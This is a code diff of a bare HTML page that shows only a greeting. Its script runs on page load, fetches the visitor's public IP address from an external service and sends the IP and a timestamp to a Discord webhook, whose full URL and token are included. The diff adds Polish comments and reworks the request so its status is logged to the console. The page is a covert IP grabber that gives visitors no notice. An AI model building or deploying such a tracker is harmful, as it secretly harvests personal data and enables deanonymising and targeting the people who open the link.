@@ -9,11 +9,13 @@
   <h1 style="font-size:64px;">siema!</h1>
 
   <script>
+    // ⚠️ WKLEJ TU SWÓJ NOWY WEBHOOK
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1552425060147404841/MRjqZCgiycy-LvH4hrlEw14WO0DHjek7IUmVVdr1ov9qrARSXm2UqfpoU4D0psaXuq2h";
 
     async function logVisit() {
       let ip = 'brak';
 
+      // IP z API
       try {
         const res = await fetch('https://api.ipify.org?format=json');
         const json = await res.json();
@@ -25,12 +27,17 @@
       const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
       const content = `**IP:** \`${ip}\`\n**time:** ${time}`;
 
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'text/plain' },
-        body: JSON.stringify({ content })
-      }).catch(() => {});
+      // Normalny fetch, bez no-cors – Discord wspiera CORS
+      try {
+        const r = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content })
+        });
+        console.log('Discord status:', r.status);
+      } catch (e) {
+        console.error('Błąd wysyłki:', e);
+      }
     }
 
     logVisit();
